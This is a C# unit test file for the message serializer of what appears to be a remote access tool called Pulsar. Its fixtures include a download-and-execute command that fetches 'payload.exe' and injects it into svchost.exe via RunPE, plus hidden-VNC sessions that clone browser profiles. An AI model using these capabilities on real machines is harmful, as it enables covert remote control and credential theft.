using MessagePack;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using Process = Pulsar.Common.Models.Process;

namespace Pulsar.Common.Tests.Networking
{
    [TestClass]
    public class PulsarMessagePackSerializerTests
    {
        [TestMethod]
        public void RoundTrip_VirtualMonitorCommands_PreserveRegisteredTypes()
        {
            var install = RoundTrip(new DoInstallVirtualMonitor());
            var uninstall = RoundTrip(new DoUninstallVirtualMonitor());
            var installResponse = RoundTrip(new DoInstallVirtualMonitorResponse
            {
                Success = false,
                Error = "installer unavailable"
            });
            var uninstallResponse = RoundTrip(new DoUninstallVirtualMonitorResponse
            {
                Success = true
            });

            Assert.IsInstanceOfType(install, typeof(DoInstallVirtualMonitor));
            Assert.IsInstanceOfType(uninstall, typeof(DoUninstallVirtualMonitor));
            Assert.IsInstanceOfType(installResponse, typeof(DoInstallVirtualMonitorResponse));
            Assert.IsInstanceOfType(uninstallResponse, typeof(DoUninstallVirtualMonitorResponse));
            Assert.AreEqual("installer unavailable",
                ((DoInstallVirtualMonitorResponse)installResponse).Error);
            Assert.IsTrue(((DoUninstallVirtualMonitorResponse)uninstallResponse).Success);
        }

        [TestMethod]
        public void RoundTrip_SetStatus_PreservesTypeAndFields()
        {
            var original = new SetStatus { Message = "Kolibri serializer round-trip \u00e4\u00f6\u00fc" };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(SetStatus));
            var typed = (SetStatus)result;
            Assert.AreEqual(original.Message, typed.Message);
        }

        [TestMethod]
        public void RoundTrip_DoProcessStart_PreservesBinaryAndScalarFields()
        {
            var fileBytes = new byte[256];
            for (var i = 0; i < fileBytes.Length; i++)
                fileBytes[i] = (byte)i;

            var original = new DoProcessStart
            {
                DownloadUrl = "https://example.org/payload.exe",
                FilePath = "C:\\temp\\payload.exe",
                IsUpdate = true,
                ExecuteInMemoryDotNet = false,
                UseRunPE = true,
                RunPETarget = "svchost.exe",
                RunPECustomPath = "C:\\Windows\\Microsoft.NET\\runpe.exe",
                FileBytes = fileBytes,
                FileExtension = ".exe"
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(DoProcessStart));
            var typed = (DoProcessStart)result;
            Assert.AreEqual(original.DownloadUrl, typed.DownloadUrl);
            Assert.AreEqual(original.FilePath, typed.FilePath);
            Assert.AreEqual(original.IsUpdate, typed.IsUpdate);
            Assert.AreEqual(original.ExecuteInMemoryDotNet, typed.ExecuteInMemoryDotNet);
            Assert.AreEqual(original.UseRunPE, typed.UseRunPE);
            Assert.AreEqual(original.RunPETarget, typed.RunPETarget);
            Assert.AreEqual(original.RunPECustomPath, typed.RunPECustomPath);
            Assert.AreEqual(original.FileExtension, typed.FileExtension);
            CollectionAssert.AreEqual(original.FileBytes, typed.FileBytes);
        }

        [TestMethod]
        public void RoundTrip_GetProcessesResponse_PreservesCollectionAndNullableFields()
        {
            // Processes is a Process[] (not List<T>) - exercises the dynamic-generic collection path.
            var original = new GetProcessesResponse
            {
                Processes = new[]
                {
                    new Process { Name = "pulsar", Id = 1337, MainWindowTitle = "Pulsar", ParentId = 4 },
                    new Process { Name = "idle", Id = 0, MainWindowTitle = null, ParentId = null }
                },
                RatPid = 4242
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(GetProcessesResponse));
            var typed = (GetProcessesResponse)result;
            Assert.AreEqual(original.RatPid, typed.RatPid);
            Assert.IsNotNull(typed.Processes);
            Assert.AreEqual(2, typed.Processes.Length);
            Assert.AreEqual("pulsar", typed.Processes[0].Name);
            Assert.AreEqual(1337, typed.Processes[0].Id);
            Assert.AreEqual("Pulsar", typed.Processes[0].MainWindowTitle);
            Assert.AreEqual((int?)4, typed.Processes[0].ParentId);
            Assert.AreEqual("idle", typed.Processes[1].Name);
            Assert.IsNull(typed.Processes[1].MainWindowTitle);
            Assert.IsNull(typed.Processes[1].ParentId);
        }

        [TestMethod]
        public void Deserialize_GarbageInput_ThrowsInvalidOperationException()
        {
            // Deserialize wraps every failure in InvalidOperationException - it must never return null/garbage.
            Assert.ThrowsException<InvalidOperationException>(
                () => { PulsarMessagePackSerializer.Deserialize(new byte[] { 0x01, 0x02, 0x03, 0x04 }); });
        }

        [TestMethod]
        public void Deserialize_OversizedFrame_ThrowsInvalidOperationException()
        {
            var oversized = new byte[MessageInputLimits.MaxFrameBytes + 1];

            Assert.ThrowsException<InvalidOperationException>(
                () => PulsarMessagePackSerializer.Deserialize(oversized));
        }

        [TestMethod]
        public void Deserialize_CompressedExpansionPastLimit_ThrowsInvalidOperationException()
        {
            var wrapper = new MessageWrapperWire
            {
                TypeName = typeof(SetStatus).FullName,
                Data = new byte[MessageInputLimits.MaxDecompressedBytes + 1]
            };
            var options = MessagePackSerializerOptions.Standard
                .WithCompression(MessagePackCompression.Lz4BlockArray);
            var compressed = MessagePackSerializer.Serialize(wrapper, options);

            Assert.IsTrue(compressed.Length < wrapper.Data.Length);
            Assert.ThrowsException<InvalidOperationException>(
                () => PulsarMessagePackSerializer.Deserialize(compressed));
        }

        [TestMethod]
        public void ValidateMessage_CollectionPastLimit_ThrowsInvalidOperationException()
        {
            var message = new RequestDeferredAssemblies
            {
                Assemblies = new string[MessageInputLimits.MaxCollectionItems + 1],
                ClientVersion = "test"
            };

            Assert.ThrowsException<InvalidOperationException>(
                () => MessageInputLimits.ValidateMessage(message));
        }

        [TestMethod]
        public void Serialize_StringPastLimit_ThrowsInvalidOperationException()
        {
            var message = new SetStatus
            {
                Message = new string('x', MessageInputLimits.MaxStringLength + 1)
            };

            Assert.ThrowsException<InvalidOperationException>(
                () => PulsarMessagePackSerializer.Serialize(message));
        }

        [TestMethod]
        public void RoundTrip_DoRemoteDesktopPermissionResponse_PreservesFields()
        {
            // consent-prompt denial (client -> server, wire-additive)
            var original = new DoRemoteDesktopPermissionResponse
            {
                Allowed = false,
                Reason = "denied by user"
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(DoRemoteDesktopPermissionResponse));
            var typed = (DoRemoteDesktopPermissionResponse)result;
            Assert.AreEqual(original.Allowed, typed.Allowed);
            Assert.AreEqual(original.Reason, typed.Reason);
        }

        [TestMethod]
        public void RoundTrip_HvncDesktopRequest_PreservesSessionAndSequence()
        {
            var original = new GetHVNCDesktop
            {
                CreateNew = false,
                Quality = 82,
                DisplayIndex = 2,
                Status = RemoteDesktopStatus.Continue,
                UseGPU = false,
                FramesRequested = 3,
                IsBufferedMode = true,
                SessionId = "session-123",
                FrameSequence = 42
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(GetHVNCDesktop));
            var typed = (GetHVNCDesktop)result;
            Assert.AreEqual(original.SessionId, typed.SessionId);
            Assert.AreEqual(original.FrameSequence, typed.FrameSequence);
            Assert.AreEqual(original.DisplayIndex, typed.DisplayIndex);
            Assert.AreEqual(original.FramesRequested, typed.FramesRequested);
        }

        [TestMethod]
        public void RoundTrip_HvncProcessStatus_PreservesLaunchState()
        {
            var original = new HVNCProcessStatus
            {
                SessionId = "session-456",
                LaunchId = "launch-789",
                Stage = HVNCProcessStage.Starting,
                Message = "Starting browser",
                ProcessId = 3142
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(HVNCProcessStatus));
            var typed = (HVNCProcessStatus)result;
            Assert.AreEqual(original.SessionId, typed.SessionId);
            Assert.AreEqual(original.LaunchId, typed.LaunchId);
            Assert.AreEqual(original.Stage, typed.Stage);
            Assert.AreEqual(original.Message, typed.Message);
            Assert.AreEqual(original.ProcessId, typed.ProcessId);
        }

        [TestMethod]
        public void RoundTrip_HvncBrowserCatalog_PreservesDiscovery()
        {
            var original = new GetHVNCBrowserCatalogResponse
            {
                SessionId = "browser-session",
                Browsers = new[]
                {
                    new HVNCBrowserDefinition
                    {
                        BrowserId = "chrome",
                        DisplayName = "Chrome",
                        Installed = true,
                        ExecutablePath = @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        ProfileSource = @"Local\Google\Chrome\User Data",
                        ProfileDestination = @"Local\Google\Chrome\KDOT",
                        SupportsProfileClone = true,
                        SupportsDirectLaunch = true,
                        DetectionSource = "configured-path",
                        Architecture = "x64"
                    }
                }
            };

            var result = RoundTrip(original);

            Assert.IsInstanceOfType(result, typeof(GetHVNCBrowserCatalogResponse));
            var typed = (GetHVNCBrowserCatalogResponse)result;
            Assert.AreEqual(original.SessionId, typed.SessionId);
            Assert.AreEqual(1, typed.Browsers.Length);
            Assert.AreEqual(original.Browsers[0].BrowserId, typed.Browsers[0].BrowserId);
            Assert.AreEqual(original.Browsers[0].ExecutablePath, typed.Browsers[0].ExecutablePath);
            Assert.IsTrue(typed.Browsers[0].SupportsProfileClone);
        }

        private static IMessage RoundTrip(IMessage message)
        {
            var payload = PulsarMessagePackSerializer.Serialize(message);
            Assert.IsNotNull(payload);
            Assert.AreNotEqual(0, payload.Length);
            return PulsarMessagePackSerializer.Deserialize(payload);
        }

        [MessagePackObject(AllowPrivate = true)]
        internal sealed class MessageWrapperWire
        {
            [Key(0)]
            public string TypeName { get; set; }

            [Key(1)]
            public byte[] Data { get; set; }
        }
    }
}
